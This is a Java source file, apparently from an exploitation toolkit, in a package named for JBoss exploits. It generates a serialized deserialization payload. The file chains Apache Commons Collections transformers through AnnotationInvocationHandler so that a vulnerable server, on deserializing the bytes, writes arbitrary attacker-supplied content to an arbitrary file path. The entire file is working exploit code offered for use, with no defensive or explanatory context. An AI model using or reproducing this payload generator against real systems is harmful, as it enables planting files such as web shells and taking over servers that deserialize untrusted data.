package serializeTools.exploit.jboss;

import org.apache.commons.collections.*;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.*;
import java.util.*;
import java.lang.annotation.*;
import java.io.*;
import java.lang.reflect.*;

public class GenFilePayload {

	public byte[] genFilePayload(String filePath,byte[] bytes) throws Exception {
		// TODO Auto-generated method stub
		final Transformer[] transformers = { 
				new ConstantTransformer(FileOutputStream.class),
				new InvokerTransformer("getConstructor",
						new Class[] { Class[].class },
						new Object[] { new Class[] { String.class } }
				),
				new InvokerTransformer("newInstance", 
						new Class[] { Object[].class },
						new Object[] { new Object[] { filePath } }
				),
				new InvokerTransformer("write", 
						new Class[] { byte[].class }, 
						new Object[] { bytes }
				) 
			};
			final Transformer transformerChain = new ChainedTransformer(transformers);
			final Map<String, String> innerMap = new HashMap<String, String>();
			innerMap.put("value", "value");
			final Map<?, ?> outMap = TransformedMap.decorate(innerMap, null, transformerChain);
			final Class<?> cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
			final Constructor<?> ctor = cls.getDeclaredConstructor(Class.class, Map.class);
			ctor.setAccessible(true);
			final Object instance = ctor.newInstance(Retention.class, outMap);
			final ByteArrayOutputStream byteArrayOut = new ByteArrayOutputStream(10);
			final ObjectOutputStream objectOut = new ObjectOutputStream(byteArrayOut);
			objectOut.writeObject(instance);
			objectOut.flush();
			objectOut.close();
			return byteArrayOut.toByteArray();
	}
}
